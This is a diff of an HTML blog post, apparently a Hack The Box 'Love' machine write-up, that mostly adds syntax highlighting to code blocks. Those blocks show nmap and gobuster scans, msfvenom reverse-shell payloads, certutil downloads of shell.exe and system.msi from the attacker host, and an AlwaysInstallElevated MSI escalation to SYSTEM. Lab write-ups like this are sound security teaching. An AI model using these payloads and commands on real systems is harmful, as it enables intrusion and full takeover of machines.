@@ -5,6 +5,9 @@
     <link href='../css/style.css' media='screen' rel='stylesheet' type='text/css' />
     <link href='../css/blog.css' media='screen' rel='stylesheet' type='text/css' />
     <link href='../css/post.css' media='screen' rel='stylesheet' type='text/css' />
+    <!-- highlight.js -->
+    <link rel="stylesheet" href="../css/atom-one-dark-reasonable.min.css">
+    <script src="../js/highlight.min.js"></script>
     <title>HTB: Love Writeup | matt johnson</title>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
     <link rel="icon" type="image/png" href="../img/favicon.png">
@@ -16,6 +19,7 @@
 </head>
 
 <body>
+    <script>hljs.highlightAll();</script>
     <div id="title">
         <a href="../index.html">
             <h1>mj&gt;<div id="animation"><span>_</span></div></h1>
@@ -34,7 +38,7 @@
     <div>
         <h3>Initial Foothold</h3>
         <p>As always, I began with an Nmap scan:</p>
-        <pre><code># Nmap 7.91 scan initiated Fri Jul  9 05:50:44 2021 as: nmap -sC -sV -p- -oA nmap 10.10.10.239
+        <pre><code class="language-markdown"># Nmap 7.91 scan initiated Fri Jul  9 05:50:44 2021 as: nmap -sC -sV -p- -oA nmap 10.10.10.239
 Nmap scan report for 10.10.10.239
 Host is up (0.097s latency).
 Not shown: 65516 closed ports
@@ -147,7 +151,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Fri Jul  9 06:03:03 2021 -- 1 IP address (1 host up) scanned in 739.20 seconds</code></pre>
 
         <p>In addition to that, I ran a gobuster scan against the main web page at port 80:</p>
-        <pre><code>===============================================================
+        <pre><code class="language-yaml">===============================================================
             Gobuster v3.1.0
             by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
             ===============================================================
@@ -316,33 +320,33 @@ Service detection performed. Please report any incorrect results at https://nmap
         <p>Success! Now to test if it's publicly viewable:</p>
         <img src="../img/posts/love/11.png" />
         <p>With that knowledge, I felt pretty comfortable that I could get a reverse shell. I used msfvenom to generate the payload, uploaded it, set up a netcat listener, and got a shell:</p>
-        <pre><code>┌──(kali㉿kali)-[~/htb/love/blog]
-            └─$ msfvenom -p php/reverse_php LHOST=10.10.14.6 LPORT=4444 -f raw > reverse.php
-            [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
-            [-] No arch selected, selecting arch: php from the payload
-            No encoder specified, outputting raw payload
-            Payload size: 3038 bytes</code></pre>
+        <pre><code class="language-shell">┌──(kali@kali)-[~/htb/love/blog]
+└─$ msfvenom -p php/reverse_php LHOST=10.10.14.6 LPORT=4444 -f raw > reverse.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 3038 bytes</code></pre>
             <img src="../img/posts/love/12.png" />
-        <pre><code>┌──(kali㉿kali)-[~/htb/love/blog]
-            └─$ sudo nc -nvlp 4444 
-            [sudo] password for kali: 
-            listening on [any] 4444 ...
-            connect to [10.10.14.6] from (UNKNOWN) [10.10.10.239] 50988
-            whoami
-            love\phoebe</code></pre>
+        <pre><code class="language-shell">┌──(kali@kali)-[~/htb/love/blog]
+└─$ sudo nc -nvlp 4444 
+[sudo] password for kali: 
+listening on [any] 4444 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.239] 50988
+whoami
+love\phoebe</code></pre>
     </div>
     <div>
         <h3>Privilege Escalation</h3>
         <p>Now, even though I had a shell at this point, the shell was absolutely awful. Worst of all was that it disconnected every couple of minutes, making proper enumeration a real pain. To solve that I generated an x64 msfvenom payload, downloaded it to the box using certutil, and executed it to get a more stable shell.</p>
-        <pre><code>┌──(kali㉿kali)-[~/htb/love/blog]
-            └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4445 -f exe > shell.exe
-            [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-            [-] No arch selected, selecting arch: x64 from the payload
-            No encoder specified, outputting raw payload
-            Payload size: 460 bytes
-            Final size of exe file: 7168 bytes
-            </code></pre>
-        <pre><code>┌──(kali㉿kali)-[~/htb/love/blog]
+        <pre><code class="language-shell">┌──(kali@kali)-[~/htb/love/blog]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4445 -f exe > shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+</code></pre>
+<pre><code class="language-shell">┌──(kali@kali)-[~/htb/love/blog]
 └─$ sudo nc -nvlp 4444                                                                      
 listening on [any] 4444 ...
 connect to [10.10.14.6] from (UNKNOWN) [10.10.10.239] 50989
@@ -350,13 +354,13 @@ certutil.exe -urlcache -f http://10.10.14.6/shell.exe shell.exe
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
 dir
- Volume in drive C has no label.
- Volume Serial Number is 56DE-BA30
+Volume in drive C has no label.
+Volume Serial Number is 56DE-BA30
 
- Directory of C:\xampp\htdocs\omrs\images
+Directory of C:\xampp\htdocs\omrs\images
 
-08/07/2021  12:14 PM    <DIR>          .
-08/07/2021  12:14 PM    <DIR>          ..
+08/07/2021  12:14 PM    &lt;DIR&gt;          .
+08/07/2021  12:14 PM    &lt;DIR&gt;          ..
 08/06/2021  07:48 PM           159,744 admin.msi
 05/18/2018  08:10 AM             4,240 facebook-profile-image.jpeg
 04/12/2021  03:53 PM                 0 index.html.txt
@@ -367,108 +371,108 @@ dir
 08/06/2021  07:06 PM             7,168 reverse1.exe
 08/07/2021  12:14 PM             7,168 shell.exe
 08/07/2021  12:04 PM                32 test.php
-              10 File(s)      2,128,366 bytes
-               2 Dir(s)   3,880,849,408 bytes free
+             10 File(s)      2,128,366 bytes
+              2 Dir(s)   3,880,849,408 bytes free
 .\shell.exe
-        </code></pre>
-        <pre><code>┌──(kali㉿kali)-[~/htb/love/blog]
-            └─$ sudo python3 -m http.server 80
-            [sudo] password for kali: 
-            Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-            10.10.10.239 - - [07/Aug/2021 14:48:07] "GET /shell.exe HTTP/1.1" 200 -
-            10.10.10.239 - - [07/Aug/2021 14:48:07] "GET /shell.exe HTTP/1.1" 200 -
-            </code></pre>
-        <pre><code>┌──(kali㉿kali)-[~/htb/love/blog]
-            └─$ sudo nc -nvlp 4445 
-            [sudo] password for kali: 
-            listening on [any] 4445 ...
-            connect to [10.10.14.6] from (UNKNOWN) [10.10.10.239] 50992
-            Microsoft Windows [Version 10.0.19042.867]
-            (c) 2020 Microsoft Corporation. All rights reserved.
-            
-            C:\xampp\htdocs\omrs\images>whoami
-            whoami
-            love\phoebe
-            
-            C:\xampp\htdocs\omrs\images>
-            </code></pre>
+</code></pre>
+        <pre><code class="language-shell">┌──(kali@kali)-[~/htb/love/blog]
+└─$ sudo python3 -m http.server 80
+[sudo] password for kali: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.239 - - [07/Aug/2021 14:48:07] "GET /shell.exe HTTP/1.1" 200 -
+10.10.10.239 - - [07/Aug/2021 14:48:07] "GET /shell.exe HTTP/1.1" 200 -
+    </code></pre>
+<pre><code class="language-shell">┌──(kali@kali)-[~/htb/love/blog]
+└─$ sudo nc -nvlp 4445 
+[sudo] password for kali: 
+listening on [any] 4445 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.239] 50992
+Microsoft Windows [Version 10.0.19042.867]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\omrs\images>whoami
+whoami
+love\phoebe
+
+C:\xampp\htdocs\omrs\images>
+    </code></pre>
 
         <p>From there, I was able to grab the user flag, download winPEAS from my machine, and run it. Within its output I found my path to root - the <code>AlwaysInstallElevated</code> privilege. This allows any user, regardless of what privileges they normally have, to install software as an administrator. This is a dangerous configuration, as the <code>.msi</code> files used to install programs can also provide commands to run during installation, which in this case would be run as a system-level user.</p>
         <img src="../img/posts/love/13.png" />
         <p>To generate the malicious payload I once again utilized msfvenom. Uploading it was, again, as simple as running certutil. I then proceeded to run the <code>.msi</code> and wait for my not-so-hard-earned shell:</p>
-        <pre><code>┌──(kali㉿kali)-[~/htb/love/blog]
-            └─$ msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4446 --encoder x64/xor --iterations 9 --format msi --out system.msi
-            Found 1 compatible encoders
-            Attempting to encode payload with 9 iterations of x64/xor
-            x64/xor succeeded with size 503 (iteration=0)
-            x64/xor succeeded with size 543 (iteration=1)
-            x64/xor succeeded with size 583 (iteration=2)
-            x64/xor succeeded with size 623 (iteration=3)
-            x64/xor succeeded with size 663 (iteration=4)
-            x64/xor succeeded with size 703 (iteration=5)
-            x64/xor succeeded with size 743 (iteration=6)
-            x64/xor succeeded with size 783 (iteration=7)
-            x64/xor succeeded with size 823 (iteration=8)
-            x64/xor chosen with final size 823
-            Payload size: 823 bytes
-            Final size of msi file: 159744 bytes
-            Saved as: system.msi</code></pre>
-        <pre><code>┌──(kali㉿kali)-[~/htb/love/blog]
-            └─$ sudo nc -nvlp 4445 
-            [sudo] password for kali: 
-            listening on [any] 4445 ...
-            connect to [10.10.14.6] from (UNKNOWN) [10.10.10.239] 50992
-            Microsoft Windows [Version 10.0.19042.867]
-            (c) 2020 Microsoft Corporation. All rights reserved.
-            
-            C:\xampp\htdocs\omrs\images>whoami
-            whoami
-            love\phoebe
-            
-            C:\xampp\htdocs\omrs\images>certutil.exe -urlcache -f http://10.10.14.6/system.msi system.msi
-            certutil.exe -urlcache -f http://10.10.14.6/system.msi system.msi
-            ****  Online  ****
-            CertUtil: -URLCache command completed successfully.
-            
-            C:\xampp\htdocs\omrs\images>dir
-            dir
-             Volume in drive C has no label.
-             Volume Serial Number is 56DE-BA30
-            
-             Directory of C:\xampp\htdocs\omrs\images
-            
-            08/07/2021  12:26 PM    <DIR>          .
-            08/07/2021  12:26 PM    <DIR>          ..
-            08/06/2021  07:48 PM           159,744 admin.msi
-            05/18/2018  08:10 AM             4,240 facebook-profile-image.jpeg
-            04/12/2021  03:53 PM                 0 index.html.txt
-            01/27/2021  12:08 AM               844 index.jpeg
-            08/06/2021  07:33 PM         1,919,488 privilege.exe
-            08/24/2017  04:00 AM            26,644 profile.jpg
-            08/06/2021  07:06 PM             7,168 reverse1.exe
-            08/07/2021  12:14 PM             7,168 shell.exe
-            08/07/2021  12:26 PM           159,744 system.msi
-                           9 File(s)      2,285,040 bytes
-                           2 Dir(s)   3,879,710,720 bytes free
-            
-            C:\xampp\htdocs\omrs\images>msiexec /quiet /qn /i system.msi
-            msiexec /quiet /qn /i system.msi
-            
-            C:\xampp\htdocs\omrs\images>
-            </code></pre>
-        <pre><code>┌──(kali㉿kali)-[~/htb/love/blog]
-            └─$ sudo nc -nvlp 4446 
-            [sudo] password for kali: 
-            listening on [any] 4446 ...
-            connect to [10.10.14.6] from (UNKNOWN) [10.10.10.239] 50995
-            Microsoft Windows [Version 10.0.19042.867]
-            (c) 2020 Microsoft Corporation. All rights reserved.
-            
-            C:\WINDOWS\system32>whoami
-            whoami
-            nt authority\system
-            
-            C:\WINDOWS\system32></code></pre>
+        <pre><code class="language-shell">┌──(kali@kali)-[~/htb/love/blog]
+└─$ msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4446 --encoder x64/xor --iterations 9 --format msi --out system.msi
+Found 1 compatible encoders
+Attempting to encode payload with 9 iterations of x64/xor
+x64/xor succeeded with size 503 (iteration=0)
+x64/xor succeeded with size 543 (iteration=1)
+x64/xor succeeded with size 583 (iteration=2)
+x64/xor succeeded with size 623 (iteration=3)
+x64/xor succeeded with size 663 (iteration=4)
+x64/xor succeeded with size 703 (iteration=5)
+x64/xor succeeded with size 743 (iteration=6)
+x64/xor succeeded with size 783 (iteration=7)
+x64/xor succeeded with size 823 (iteration=8)
+x64/xor chosen with final size 823
+Payload size: 823 bytes
+Final size of msi file: 159744 bytes
+Saved as: system.msi</code></pre>
+        <pre><code class="language-shell">┌──(kali@kali)-[~/htb/love/blog]
+└─$ sudo nc -nvlp 4445 
+[sudo] password for kali: 
+listening on [any] 4445 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.239] 50992
+Microsoft Windows [Version 10.0.19042.867]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\omrs\images>whoami
+whoami
+love\phoebe
+
+C:\xampp\htdocs\omrs\images>certutil.exe -urlcache -f http://10.10.14.6/system.msi system.msi
+certutil.exe -urlcache -f http://10.10.14.6/system.msi system.msi
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+C:\xampp\htdocs\omrs\images>dir
+dir
+    Volume in drive C has no label.
+    Volume Serial Number is 56DE-BA30
+
+    Directory of C:\xampp\htdocs\omrs\images
+
+08/07/2021  12:26 PM    &lt;DIR&gt;          .
+08/07/2021  12:26 PM    &lt;DIR&gt;          ..
+08/06/2021  07:48 PM           159,744 admin.msi
+05/18/2018  08:10 AM             4,240 facebook-profile-image.jpeg
+04/12/2021  03:53 PM                 0 index.html.txt
+01/27/2021  12:08 AM               844 index.jpeg
+08/06/2021  07:33 PM         1,919,488 privilege.exe
+08/24/2017  04:00 AM            26,644 profile.jpg
+08/06/2021  07:06 PM             7,168 reverse1.exe
+08/07/2021  12:14 PM             7,168 shell.exe
+08/07/2021  12:26 PM           159,744 system.msi
+                9 File(s)      2,285,040 bytes
+                2 Dir(s)   3,879,710,720 bytes free
+
+C:\xampp\htdocs\omrs\images>msiexec /quiet /qn /i system.msi
+msiexec /quiet /qn /i system.msi
+
+C:\xampp\htdocs\omrs\images>
+</code></pre>
+        <pre><code class="language-shell">┌──(kali@kali)-[~/htb/love/blog]
+└─$ sudo nc -nvlp 4446 
+[sudo] password for kali: 
+listening on [any] 4446 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.239] 50995
+Microsoft Windows [Version 10.0.19042.867]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>whoami
+whoami
+nt authority\system
+
+C:\WINDOWS\system32></code></pre>
     </div>
     <br />
     <br />
